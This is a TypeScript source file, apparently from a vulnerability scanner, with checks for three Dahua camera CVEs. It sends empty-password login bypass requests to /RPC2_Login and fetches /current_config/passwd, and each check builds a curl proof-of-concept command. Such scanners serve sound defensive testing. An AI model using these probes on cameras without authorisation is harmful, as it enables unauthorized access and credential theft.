import type { CveCheck, CveTestResult, FingerprintResult } from '../types/index.js';
import { httpGet } from '../utils/network.js';

export const dahuaChecks: CveCheck[] = [
  {
    cveId: 'CVE-2021-33044',
    vendor: 'dahua',
    title: 'Dahua Authentication Bypass via Login Process',
    severity: 'critical',
    description: 'Dahua products authenticate via a custom challenge-response over /RPC2. An attacker can bypass authentication by manipulating the login process to bypass the credential check.',
    affectedModels: ['IPC-HDW*', 'IPC-HFW*', 'DH-NVR*'],
    affectedFirmware: [],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        // Probe the login endpoint
        const { httpPost } = await import('../utils/network.js');
        const loginResp = await httpPost(
          `${baseUrl}/RPC2_Login`,
          {
            method: 'global.login',
            params: {
              userName: 'admin',
              password: '',
              clientType: 'Web3.0',
              loginType: 'Direct',
            },
            id: 1,
          },
          { timeout: 8000 }
        );

        const body = typeof loginResp.data === 'string'
          ? loginResp.data
          : JSON.stringify(loginResp.data || '');

        // Check if we get a session without valid credentials
        const hasSession = /session/i.test(body) && !/error/i.test(body);
        const vulnerable = loginResp.status === 200 && hasSession;

        return {
          cveId: 'CVE-2021-33044',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Authentication Bypass via Login Process',
          severity: 'critical',
          vulnerable,
          evidence: vulnerable
            ? `RPC2_Login accepted empty credentials and returned a session (HTTP ${loginResp.status})`
            : `Login properly rejected empty credentials (HTTP ${loginResp.status})`,
          poc: `curl -X POST "${baseUrl}/RPC2_Login" -d '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0","loginType":"Direct"},"id":1}'`,
          remediation: 'Update firmware. Dahua released patches in June 2021.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2021-33044',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Authentication Bypass via Login Process',
          severity: 'critical',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },

  {
    cveId: 'CVE-2020-25078',
    vendor: 'dahua',
    title: 'Dahua Credential Disclosure via /current_config/passwd',
    severity: 'high',
    description: 'D-Link DCS and Dahua cameras expose credentials via /current_config/passwd endpoint without authentication.',
    affectedModels: ['DCS-*', 'IPC-*'],
    affectedFirmware: [],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        const resp = await httpGet(`${baseUrl}/current_config/passwd`, { timeout: 8000 });
        const body = typeof resp.data === 'string' ? resp.data : '';

        const vulnerable =
          resp.status === 200 &&
          (body.includes('admin') || body.includes('root') || body.includes(':'));

        return {
          cveId: 'CVE-2020-25078',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Credential Disclosure',
          severity: 'high',
          vulnerable,
          evidence: vulnerable
            ? `Credentials exposed at /current_config/passwd (HTTP ${resp.status}) â€” contains user data`
            : `Endpoint not accessible or no credentials exposed (HTTP ${resp.status})`,
          poc: `curl "${baseUrl}/current_config/passwd"`,
          remediation: 'Update firmware to latest version. Restrict network access to the device.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2020-25078',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Credential Disclosure',
          severity: 'high',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },

  {
    cveId: 'CVE-2021-33045',
    vendor: 'dahua',
    title: 'Dahua Authentication Bypass via clientType',
    severity: 'critical',
    description: 'Dahua products allow authentication bypass by specifying specific clientType values in the login request, allowing full admin access without credentials.',
    affectedModels: ['IPC-HDW*', 'IPC-HFW*', 'NVR*'],
    affectedFirmware: [],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        const { httpPost } = await import('../utils/network.js');
        const loginResp = await httpPost(
          `${baseUrl}/RPC2_Login`,
          {
            method: 'global.login',
            params: {
              userName: 'admin',
              password: '',
              clientType: 'NetKeyboard',
              loginType: 'Direct',
            },
            id: 1,
          },
          { timeout: 8000 }
        );

        const body = typeof loginResp.data === 'string'
          ? loginResp.data
          : JSON.stringify(loginResp.data || '');

        const hasSession = /session/i.test(body) && !/error/i.test(body);
        const vulnerable = loginResp.status === 200 && hasSession;

        return {
          cveId: 'CVE-2021-33045',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Auth Bypass via clientType',
          severity: 'critical',
          vulnerable,
          evidence: vulnerable
            ? `Login accepted with clientType=NetKeyboard and empty password (HTTP ${loginResp.status})`
            : `Login properly rejected bypass attempt (HTTP ${loginResp.status})`,
          poc: `curl -X POST "${baseUrl}/RPC2_Login" -d '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard","loginType":"Direct"},"id":1}'`,
          remediation: 'Update firmware to versions released after June 2021.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2021-33045',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Dahua Auth Bypass via clientType',
          severity: 'critical',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },
];
